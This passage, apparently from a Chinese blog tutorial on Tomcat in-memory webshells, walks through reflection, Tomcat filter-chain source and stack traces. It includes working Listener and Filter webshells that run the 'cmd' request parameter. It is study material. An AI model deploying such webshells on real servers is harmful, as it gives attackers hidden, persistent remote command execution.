+            <span class="token comment" spellcheck="true">// 获取字段的值</span>
+            Object value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字段的值："</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> String  myField <span class="token operator">=</span> <span class="token string">"Hello, qingfeng!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+例二<span class="token punctuation">[</span>Field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalAccessException <span class="token punctuation">{</span>
+        MyClass obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 获取 Class 对象</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 获取字段的值</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Field field <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"myField"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "myField" 是字段的名称</span>
+            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置为可访问，以便获取或设置私有字段的值</span>
+
+            <span class="token comment" spellcheck="true">// 获取字段的值</span>
+            Object value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字段的值："</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> String  myField <span class="token operator">=</span> <span class="token string">"Hello, qingfeng!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+</code></pre>
+<h3 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="javax.servlet.annotation.WebListener" %>
+<%!
+    @WebListener
+    public class ServletListener implements ServletRequestListener {
+        @Override
+        public void requestDestroyed (ServletRequestEvent sre) {
+            System.out.println("requestDestroyed");
+        }
+
+        @Override
+        public void requestInitialized (ServletRequestEvent sre) {
+            ServletRequest servletRequest = sre.getServletRequest();
+            String cmd = servletRequest.getParameter("cmd");
+            if(cmd != null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+    }
+%>
+
+<%
+    Field requestField = request.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    Request requests = (Request) requestField.get(request);
+    StandardContext context = (StandardContext)requests.getContext();
+    ServletListener servletListener = new ServletListener();
+    context.addApplicationEventListener(servletListener);
+%>
+</code></pre>
+<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>Filter是链式调用执行的，Filter会在访问不Web资源之前被执行，而且定义Filter时可以根据访问的路径来设置，相对来说更灵活。</p>
+<p>首先同理创建一个Java文件写Filter型内存马：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebFilter<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>
+        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span> ServletResponse response<span class="token punctuation">,</span> FilterChain chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>
+        String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>记得要加<code>chain.doFilter(request, response);</code>​不然后面都被阻塞了</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302110337-pd1ucxt.png" alt="image">​</p>
+<p>在cmd下断点看堆栈情况：</p>
+<pre class=" language-java"><code class="language-java">doFilter<span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token function">ServletFilter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">)</span>
+internalDoFilter<span class="token operator">:</span><span class="token number">178</span><span class="token punctuation">,</span> <span class="token function">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+doFilter<span class="token operator">:</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token function">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">168</span><span class="token punctuation">,</span> <span class="token function">StandardWrapperValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token function">StandardContextValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">481</span><span class="token punctuation">,</span> <span class="token function">AuthenticatorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>authenticator<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token function">StandardHostValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token function">ErrorReportValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>valves<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">670</span><span class="token punctuation">,</span> <span class="token function">AbstractAccessLogValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>valves<span class="token punctuation">)</span>
+invoke<span class="token operator">:</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token function">StandardEngineValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+service<span class="token operator">:</span><span class="token number">342</span><span class="token punctuation">,</span> <span class="token function">CoyoteAdapter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">)</span>
+service<span class="token operator">:</span><span class="token number">390</span><span class="token punctuation">,</span> <span class="token function">Http11Processor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span>http11<span class="token punctuation">)</span>
+process<span class="token operator">:</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token function">AbstractProcessorLight</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>
+process<span class="token operator">:</span><span class="token number">928</span><span class="token punctuation">,</span> AbstractProtocol$<span class="token function">ConnectionHandler</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>
+doRun<span class="token operator">:</span><span class="token number">1794</span><span class="token punctuation">,</span> NioEndpoint$<span class="token function">SocketProcessor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token function">SocketProcessorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>
+runWorker<span class="token operator">:</span><span class="token number">1191</span><span class="token punctuation">,</span> <span class="token function">ThreadPoolExecutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">659</span><span class="token punctuation">,</span> ThreadPoolExecutor$<span class="token function">Worker</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">61</span><span class="token punctuation">,</span> TaskThread$<span class="token function">WrappingRunnable</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">,</span> <span class="token function">Thread</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span>
+</code></pre>
+<p>和Listener同理，我们直接定位关键步骤<code>internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)</code>​</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">internalDoFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span>
+                                  ServletResponse response<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>
+
+        <span class="token comment" spellcheck="true">// Call the next filter if there is one</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ApplicationFilterConfig filterConfig <span class="token operator">=</span> filters<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                Filter filter <span class="token operator">=</span> filterConfig<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"false"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>
+                        filterConfig<span class="token punctuation">.</span><span class="token function">getFilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>ASYNC_SUPPORTED_ATTR<span class="token punctuation">,</span> Boolean<span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span> Globals<span class="token punctuation">.</span>IS_SECURITY_ENABLED <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">final</span> ServletRequest req <span class="token operator">=</span> request<span class="token punctuation">;</span>
+                    <span class="token keyword">final</span> ServletResponse res <span class="token operator">=</span> response<span class="token punctuation">;</span>
+                    Principal principal <span class="token operator">=</span>
+                        <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+                    SecurityUtil<span class="token punctuation">.</span><span class="token function">doAsPrivilege</span> <span class="token punctuation">(</span><span class="token string">"doFilter"</span><span class="token punctuation">,</span> filter<span class="token punctuation">,</span> classType<span class="token punctuation">,</span> args<span class="token punctuation">,</span> principal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    filter<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> ServletException <span class="token operator">|</span> RuntimeException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                e <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.filter"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">// We fell off the end of the chain -- call the servlet instance</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ApplicationDispatcher<span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>servletSupportsAsync<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>ASYNC_SUPPORTED_ATTR<span class="token punctuation">,</span>
+                        Boolean<span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">// Use potentially wrapped request from this point</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+                    <span class="token punctuation">(</span>response <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+                    Globals<span class="token punctuation">.</span>IS_SECURITY_ENABLED <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">final</span> ServletRequest req <span class="token operator">=</span> request<span class="token punctuation">;</span>
+                <span class="token keyword">final</span> ServletResponse res <span class="token operator">=</span> response<span class="token punctuation">;</span>
+                Principal principal <span class="token operator">=</span>
+                    <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>req<span class="token punctuation">,</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span>
+                SecurityUtil<span class="token punctuation">.</span><span class="token function">doAsPrivilege</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">,</span>
+                                           servlet<span class="token punctuation">,</span>
+                                           classTypeUsedInService<span class="token punctuation">,</span>
+                                           args<span class="token punctuation">,</span>
+                                           principal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                servlet<span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> ServletException <span class="token operator">|</span> RuntimeException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.servlet"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ApplicationDispatcher<span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Filter的流程相对Listener来说更麻烦，StandardContext并没有类似addFilter的方法，上面我们也提到了Filter是链式调用，所以接受的是一个FilterMap，还需要利用FilterMap把我们的恶意类包装起来。</p>
+<p>‍</p>
+<p>首先找到filters属性的定义看他的类型：</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303095319-e0o5wdy.png" alt="image">​</p>
+<p>需要一个<code>ApplicationFilterConfig类</code>​，往上一步看是如何创建<code>ApplicationFilterConfig类的</code>​</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303100009-s0l5xmk.png" alt="image">​</p>
+<p><code>ApplicationFilterFactory</code>​的<code>createFilterChain</code>​方法创建了<code>ApplicationFilterChain</code>​类，跟进<code>createFilterChain</code>​看一下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> ApplicationFilterChain <span class="token function">createFilterChain</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span>
+            Wrapper wrapper<span class="token punctuation">,</span> Servlet servlet<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// If there is no servlet to execute, return null</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>servlet \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Create and initialize a filter chain object</span>
+        ApplicationFilterChain filterChain \<span class="token operator">=</span> null<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Request req \<span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> request<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>IS\_SECURITY\_ENABLED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// Security: Do not recycle</span>
+                filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                filterChain \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterChain<span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>filterChain \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    req<span class="token punctuation">.</span><span class="token function">setFilterChain</span><span class="token punctuation">(</span>filterChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// Request dispatcher in use</span>
+            filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        filterChain<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span>servlet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterChain<span class="token punctuation">.</span><span class="token function">setServletSupportsAsync</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// Acquire the filter mappings for this Context</span>
